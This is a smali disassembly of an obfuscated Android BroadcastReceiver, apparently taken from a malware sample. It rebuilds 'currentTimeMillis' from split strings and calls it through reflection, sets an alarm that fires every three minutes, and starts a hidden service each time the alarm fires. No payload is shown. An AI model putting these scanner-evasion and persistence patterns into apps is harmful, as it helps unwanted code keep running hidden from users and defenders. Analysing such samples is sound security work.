.class public Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field a:Ljava/lang/String;

.field private b:Landroid/app/AlarmManager;

.field private c:Landroid/content/Intent;

.field private d:Landroid/app/PendingIntent;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    const-string v0, "tTimeM"

    iput-object v0, p0, Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;->a:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public a(Landroid/content/Context;)V
    .locals 8

    const-wide/32 v4, 0x2bf20

    const/4 v1, 0x0

    const-wide/16 v2, 0x0

    :try_start_0
    const-string v0, "java.lang.System"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "curren"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v7, p0, Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;->a:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "illis"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    new-array v7, v7, [Ljava/lang/Class;

    invoke-virtual {v0, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v6, 0x0

    const/4 v7, 0x0

    new-array v7, v7, [Ljava/lang/Object;

    invoke-virtual {v0, v6, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Long;

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result-wide v2

    :goto_0
    const-string v0, "alarm"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    iput-object v0, p0, Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;->b:Landroid/app/AlarmManager;

    new-instance v0, Landroid/content/Intent;

    const-class v6, Lbwzr/ymdpktqd/uqebgehalqoy/SunghfdDfs;

    invoke-direct {v0, p1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;->c:Landroid/content/Intent;

    iget-object v0, p0, Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;->c:Landroid/content/Intent;

    invoke-static {p1, v1, v0, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    iput-object v0, p0, Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;->d:Landroid/app/PendingIntent;

    add-long/2addr v2, v4

    iget-object v0, p0, Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;->b:Landroid/app/AlarmManager;

    iget-object v6, p0, Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;->d:Landroid/app/PendingIntent;

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    invoke-virtual {p0, p1}, Lbwzr/ymdpktqd/uqebgehalqoy/Bobbkilg;->a(Landroid/content/Context;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lbwzr/ymdpktqd/uqebgehalqoy/WoGetrj;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method
